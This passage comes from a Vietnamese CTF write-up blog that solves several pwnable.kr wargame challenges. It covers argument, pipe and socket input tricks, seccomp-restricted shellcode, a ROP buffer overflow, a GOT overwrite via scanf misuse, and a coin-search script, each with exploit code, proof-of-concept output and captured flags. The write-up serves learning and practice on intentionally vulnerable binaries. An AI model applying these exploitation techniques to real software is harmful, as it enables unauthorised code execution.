        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        system("/bin/cat flag");
        return 0;
}

input2@pwnable:~$
```

Challenge này yêu cầu người chơi biết các cách để truyền dữ liệu vào trong một chương trình.

**Solution**

```python
from pwn import *

# Stage 1
state1 = ['a'] * 100
state1[65] = '\x00'
state1[66] = '\x20\x0a\x0d'
state1[67] = '1337'

# Stage 2

stdin, wstdin = os.pipe()
stderr, wstderr = os.pipe()

os.write(wstdin, b"\x00\x0a\x00\xff")
os.write(wstderr, b"\x00\x0a\x02\xff")

# Stage 3

env = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}

# Stage 4

with open("\x0a", "wb") as f:
    f.write(b"\x00\x00\x00\x00")

p = process(executable="input" ,argv=state1, stdin=stdin, stderr=stderr, env=env)

# Stage 5

r = remote("0", 1337)
r.sendline(b"\xde\xad\xbe\xef")

p.interactive()
```

**POC**

```bash
input2@pwnable:~$ cd /tmp/
input2@pwnable:/tmp$ mkdir solshr3wd
input2@pwnable:/tmp$ cd solshr3wd
input2@pwnable:/tmp/solshr3wd$ ln -s /home/input2/flag flag
input2@pwnable:/tmp/solshr3wd$ nano input2.py
Unable to create directory /home/input2/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

input2@pwnable:/tmp/solshr3wd$ python input2.py
[+] Starting local process '/home/input2/input': pid 85739
[+] Opening connection to 0 on port 1337: Done
[*] Closed connection to 0 port 1337
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
```

### asm (6 pt)

```
Start day: 11/3/2025
End day: 11/3/2025
Evaluate: Easy
```

```txt
Information: 6 points

Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)
```

**Source code**

```bash
asm@pwnable:~$ ls
asm
asm.c
readme
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
asm@pwnable:~$ cat asm.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}

asm@pwnable:~$
```

Ở bài này, chương trình cho phép truyền vào shellcode để thực thi. Tuy nhiên, chương trình chỉ cho phép dùng các syscall: **open**, **read** và **write**

Dùng shellcraft trong pwntools để tạo một shellcode đọc file với 3 syscalls này

```python
from pwn import *


context(arch='amd64', os='linux')

file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
length = 50

shellcode = asm(
	shellcraft.open(file_name) +
	shellcraft.read('rax', 'rsp', 100) +
	shellcraft.write(1, 'rsp', 100) +
	shellcraft.exit(0))

info(f"Shellcode: {disasm(shellcode)}")
write("shellcode", shellcode)
```

**POC**

```bash
asm@pwnable:~$ cat /tmp/asmshr3wd/shellcode | nc 0 9026
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: Mak1ng_shelLcodE_i5_veRy_eaSy
lease_read_this_file.sorry_the_file_name_is_very_looooooooooooooooooooasm@pwnable:~$
```

### horcruxes (7 pt)

```
Start day: 11/3/2025
End day: 11/3/2025
Evaluate: Easy
```

```txt
Information: 7 points

Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

**Source code**

```bash
horcruxes@pwnable:~$ ls
horcruxes  readme
horcruxes@pwnable:~$ cat readme
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.

horcruxes@pwnable:~$
```

Ở challenge này không được cung cấp mã nguồn => Dùng IDA để phân tích.

**Main function**
![alt img](/img/2025/pwnable.kr/image-5.png)

**init_ABCDEFG function**

![alt img](/img/2025/pwnable.kr/image-6.png)

**ropme function**

![alt img](/img/2025/pwnable.kr/image-7.png)

Ở hàm **ropme**, có lỗi BOF ở hàm **gets(s)**. Kết hợp với tên hàm là rop, nên mình dự đoán bài này dùng kỹ thuật ROP để đọc các giá trị của các biến **a, b, c, d, e, f, g** rồi tính ra **sum**.

> Ban đầu, mình nghĩ sẽ BOF để quay lại hàm **init_ABCDEFG**, sau đó rop đến địa chỉ của một hàm **puts** để in ra giá trị của **sum** cho tiết kiệm thời gian. Tuy nhiên, địa chỉ ở hàm **init_ABCDEFG** đều có dạng `080A****`.
    - Hàm **gets** sẽ lấy chuỗi nhập vào từ stdin cho đến ghi gặp ký tự xuống dòng **"\n"**, hay là **"0x0a"**
    - Do vậy nếu quay về hàm **init_ABCDEFG** thì sẽ chỉ nhận được 2 byte cuối địa chỉ thay vì toàn bộ địa chỉ
    => Điều này là không thể
    
**Exploit code**

```python
from pwn import *
import re
info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
def GDB(p):
   if not args.REMOTE:
       gdb.attach(p, gdbscript='''
       b*0x080a0107

       c
       ''')
       input()

exe = "./horcruxes"
elf = context.binary = ELF(exe, checksec=False)

io = start()

sla(io, b"Menu:", b"1")
call_ropme = 0x0809FFFC

padding = 120

payload = flat(
    b"A" * padding,
    p32(elf.sym.A),
    p32(elf.sym.B),
    p32(elf.sym.C),
    p32(elf.sym.D),
    p32(elf.sym.E),
    p32(elf.sym.F),
    p32(elf.sym.G),
    p32(call_ropme)
)

sla(io, b"earned? : ", payload)

io.recvline()
result = 0

for i in range(7):
    data = io.recvline().decode()
    result = eval(f"{result} {re.findall(r'\(EXP (\+\-?\d+)\)', data)[0]}")
result =  result % (2 ** 32)

if result > 2147483647:
    result -= 2 ** 32
if result < -2147483648:
    result += 2 ** 32
    
info(f"Sum: {result}")

sla(io, b"Menu:", b"1")
sla(io, b"earned? : ", str(result).encode())

data = io.recvline().decode()
info(f"Flag: {data}")
```

**POC**

```bash
└─$ python3 sol.py REMOTE pwnable.kr 9032
[+] Opening connection to pwnable.kr on port 9032: Done
[*] Sum: 1950399133
[*] Flag: Magic_spell_1s_4vad4_K3daVr4!
[*] Closed connection to pwnable.kr port 9032
```

### passcode (10 pt)

```
Start day: 11/3/2025
End day: 11/3/2025
Evaluate: Easy
```

```txt
Information: 10 points

Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

**Source code**

```bash
passcode@pwnable:~$ ls
flag  passcode  passcode.c
passcode@pwnable:~$ cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

passcode@pwnable:~$
```

Dựa vào mô tả của challenge và phân tích source code, mình nhận thấy có một lỗi ở hàm **scanf**. Cụ thể là: `scanf("%d", passcode1);` và `scanf("%d", passcode2);`.
=> Ở đây, khi nhập giá trị vào cho một biến kiểu int thì phải truyền vào **con trỏ địa chỉ** đến biến đó, nhưng ở đây truyền vào lại là **giá trị của biến**

> Đoạn code đúng phải là: `scanf("%d", &passcode1);`

Để biết được hàm scanf sẽ ghi vào địa chỉ nào thì quay lại việc hàm sử dụng **stack frame**.

Hàm **login()** được gọi ngay sau khi hàm **welcome()** được gọi => **Stack frame** sẽ trùng nhau

![alt img](/img/2025/pwnable.kr/image-8.png)

![alt img](/img/2025/pwnable.kr/image-9.png)

=> Giá trị của biến **passcode1** sẽ là giá trị của biến **name** ở địa chỉ có index là: `(-0x0C) - (-0x70) = 0x60 (Dec: 96)`

=> Tức là payload để nhập giá trị cho **passcode1** sẽ là: `b'A' * 96 + b'\xe6\x28\x05\x00'`

```bash
pwndbg> 
0x08048586 in login ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────
 EAX  0x8048783 ◂— and eax, 0x6e650064 /* '%d' */
 EBX  0xf7faae14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x235d0c /* '\x0c]#' */
 ECX  0
 EDX  0x528e6
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80486a0 (__libc_csu_init) ◂— push ebp
 EBP  0xffffc838 —▸ 0xffffc858 ◂— 0
 ESP  0xffffc810 —▸ 0x8048783 ◂— and eax, 0x6e650064 /* '%d' */
*EIP  0x8048586 (login+34) —▸ 0xffff15e8 ◂— 0
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────
   0x804857c <login+24>    mov    edx, dword ptr [ebp - 0x10]     EDX, [0xffffc828] => 0x528e6
   0x804857f <login+27>    mov    dword ptr [esp + 4], edx        [0xffffc814] <= 0x528e6
   0x8048583 <login+31>    mov    dword ptr [esp], eax            [0xffffc810] <= 0x8048783 ◂— and eax, 0x6e650064 /* '%d' */
 ► 0x8048586 <login+34>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
        format: 0x8048783 ◂— 0x65006425 /* '%d' */
        vararg: 0x528e6
 
   0x804858b <login+39>    mov    eax, dword ptr [0x804a02c]      EAX, [stdin@@GLIBC_2.0]
   0x8048590 <login+44>    mov    dword ptr [esp], eax
   0x8048593 <login+47>    call   fflush@plt                  <fflush@plt>
 
   0x8048598 <login+52>    mov    eax, 0x8048786                  EAX => 0x8048786 ◂— outsb dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */
   0x804859d <login+57>    mov    dword ptr [esp], eax
   0x80485a0 <login+60>    call   printf@plt                  <printf@plt>
 
   0x80485a5 <login+65>    mov    eax, 0x8048783                  EAX => 0x8048783 ◂— and eax, 0x6e650064 /* '%d' */
────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffc810 —▸ 0x8048783 ◂— and eax, 0x6e650064 /* '%d' */
01:0004│-024 0xffffc814 ◂— 0x528e6
02:0008│-020 0xffffc818 ◂— 0x41414141 ('AAAA')
... ↓        3 skipped
06:0018│-010 0xffffc828 ◂— 0x528e6
07:001c│-00c 0xffffc82c ◂— 0x6163cf00
──────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x8048586 login+34
   1 0x8048684 main+31
   2 0xf7d99d43 __libc_start_call_main+115
   3 0xf7d99e08 __libc_start_main+136
   4 0x80484d1 _start+33
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

Tuy nhiên tới đây, mình nhận ra không thể ghi đè giá trị của **passcode2** bằng cách này được.

Hmmmm...

Tới đây, mình nghĩ ra một cách khác là thay vì tìm cách ghi giá trị cho 2 biến **passcode1** và **passcode2** cho hợp lý thì mình sẽ tìm cách thay đổi một giá trị nào đó khiến cho chương trình hoạt động theo ý mình muốn.

Ở đây, mình sẽ cần 2 gadgets để thực hiện việc trên:
- Tìm địa chỉ để ghi đè, thay đổi.
    > Trong các địa chỉ có quyền **write** thì mình nhớ đến **GOT (Global Offset Table)** - **0x804a004**. Ở đây mình sẽ chọn **fflush@GOT** vì nó là hàm sẽ được gọi đến ngay sau khi thực hiện việc `scanf("%d", passcode1);`
- Tìm địa chỉ để ghi đè 
    > Ở đây mình sẽ chọn ngay đến **0x080485d7**, vì nó sẽ thực hiện việc đẩy chuỗi **"Login OK!"** lên stack sau đó in ra màn hình (Mình chọn ở đây, do nếu flag có lỗi hay gì thì vẫn có evidence chứng mình exploit thành công)
    ```asm
    0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   ```

Vậy payload khai thác sẽ là: `b'A' * 96 + b'\x04\xa0\x04\x08' + str(0x080485d7).encode()`

> **0x080485d7** phải truyền vào dưới dạng chuỗi vì nó sẽ là giá trị mình sẽ nhập vào khi được yêu cầu nhập **passcode1** => Ghi đè giá trị tại địa chỉ đã được ghi đè trước đó (Ở đây là **fflush@GOT**)

**POC**

```bash
passcode@pwnable:~$ python2 -c "print b'A' * 96 + b'\x04\xa0\x04\x08' + str(0x080485d7).encode()"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA134514135
passcode@pwnable:~$ python2 -c "print b'A' * 96 + b'\x04\xa0\x04\x08' + str(0x080485d7).encode()" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
enter passcode1 : Login OK!
Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)
passcode@pwnable:~$
```

### coin1 (6 pt)


```
Start day: 11/3/2025
End day: 11/3/2025
Evaluate: Easy
```

```txt
Information: 6 points

Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

Running at : nc pwnable.kr 9007
```

Bài này không cung cấp source code, nên mình cố gắng kết nối đến server thì nhận được thông tin sau


![alt img](/img/2025/pwnable.kr/image-10.png)


Vậy là bài này sẽ là một bài giải toán :>

**Solution** (Chưa tối ưu lắm, làm xong nhanh còn làm Đồ án @@ - P/s: Có thời gian sẽ quay lại tối ưu sau kkk)

```python
from pwn import *

r = remote("0", 9007)

r.recv(4096)

def solve(N, C):
    array = list(range(0, N))
    mid = N // 2
    left = array[:mid]
    right = array[mid:]
    mark = "l"
    result = 0
    for i in range(C):
        if mark == 'l':
            data_send = " ".join(map(str, left)).encode()
        else:
            data_send = " ".join(map(str, right)).encode()
        r.sendline(data_send)
        
        data_recv = int(r.recvline().decode())
        if data_recv == 9:
            result = int(data_send)
            continue
        elif data_recv == 10:
            if len(right) == 1:
                result = right[0]
                continue

        if data_recv % 10 == 0:
            array = left if mark == 'r' else right
        else:
            array = left if mark == 'l' else right
        mid = len(array) // 2
        left = array[:mid]
        right = array[mid:]
    info("[Client] Result: %d" % result)
    r.sendline(str(result).encode())


for i in range(100):
    data = r.recvline().decode()
    data = data.split(" ")
    n, c = int(data[0][2:]), int(data[1][2:])
    info("Phase %d: N = %d ; C = %d" % (i, n, c))
    solve(n, c)
    info("[Server response]: %s" % r.recvline().decode())
    
r.interactive()
```

![alt img](/img/2025/pwnable.kr/image-11.png)


### 